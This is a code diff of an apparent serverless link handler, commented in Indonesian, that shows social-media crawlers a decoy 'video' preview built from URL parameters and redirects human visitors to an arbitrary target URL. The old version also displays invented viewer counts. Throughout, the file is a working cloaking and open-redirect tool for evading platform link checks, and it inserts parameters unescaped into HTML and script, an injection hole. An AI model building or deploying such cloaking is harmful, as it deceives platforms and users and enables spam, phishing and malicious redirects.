@@ -1,35 +1,37 @@
 export async function onRequest(context) {
-  const url = new URL(context.request.url);
-  // Mengambil bagian setelah slash terakhir
-  // Contoh: /bola/base64kode -> p = "base64kode"
-  const pathParts = url.pathname.split('/');
-  const p = pathParts[pathParts.length - 1];
+  const { searchParams } = new URL(context.request.url);
   
-  let u = 'https://google.com', t = 'Loading...', i = '';
+  // Mengambil data dari URL Parameter
+  const title = searchParams.get('t') || "Video Terbaru";
+  const image = searchParams.get('i') || "https://via.placeholder.com/600x315";
+  const desc = searchParams.get('d') || "Klik untuk menonton selengkapnya...";
+  const domain = searchParams.get('dom') || "NEWS-VIDEO.NET";
+  const target = searchParams.get('url') || "https://google.com";
 
-  if (p && p.length > 10) { // Cek apakah p ada dan cukup panjang (bukan sekedar path kosong)
-    try {
-      const decoded = atob(p);
-      const params = new URLSearchParams(decoded);
-      u = params.get('u') || u;
-      t = params.get('t') || t;
-      i = params.get('i') || i;
-    } catch (e) {}
-  }
+  const html = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <meta charset="UTF-8">
+      <title>${title}</title>
+      <meta property="og:type" content="video.other">
+      <meta property="og:title" content="${title}">
+      <meta property="og:description" content="${desc}">
+      <meta property="og:image" content="${image}">
+      <meta property="og:site_name" content="${domain}">
+      <meta property="fb:app_id" content="966242223397117">
+      <script>
+        // Redirect jika bukan bot Facebook
+        if (!navigator.userAgent.includes('facebookexternalhit')) {
+          window.location.href = "${target}";
+        }
+      </script>
+    </head>
+    <body>Redirecting...</body>
+    </html>
+  `;
 
-  const randomNum = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
-  const formattedNum = randomNum.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-  const variations = [`${formattedNum} Online Members`, `${formattedNum} Views Active`, `${formattedNum} Active Now` ];
-  const d = variations[Math.floor(Math.random() * variations.length)];
-
-  const ua = context.request.headers.get('user-agent') || '';
-  const isBot = /facebookexternalhit|Facebot|WhatsApp|Messenger|Twitterbot/i.test(ua);
-
-  if (isBot) {
-    return new Response(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>${t}</title><meta name="description" content="${d}"><meta property="og:title" content="${t}"><meta property="og:description" content="${d}"><meta property="og:image" content="${i}"><meta property="og:type" content="website"><meta name="twitter:card" content="summary_large_image"></head><body></body></html>`, { 
-      headers: { "content-type": "text/html;charset=UTF-8" } 
-    });
-  }
-
-  return new Response(null, { status: 302, headers: { "Location": u } });
+  return new Response(html, {
+    headers: { "content-type": "text/html;charset=UTF-8" },
+  });
 }
